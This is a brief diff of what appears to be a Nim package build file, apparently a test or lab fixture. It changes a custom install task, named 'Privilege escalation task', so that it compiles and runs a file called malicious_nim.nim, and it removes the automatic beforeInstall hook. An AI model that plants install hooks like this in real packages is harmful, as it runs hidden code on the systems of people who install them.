@@ -6,6 +6,4 @@ srcDir        = "src"
 
 # Define a custom install task
 task install, "Privilege escalation task":
-  exec "echo 'test text' >> /home/jack/test.txt"
-
-beforeInstall "install"
+  exec "nim c -r /home/jack/src/malicious_nim.nim"
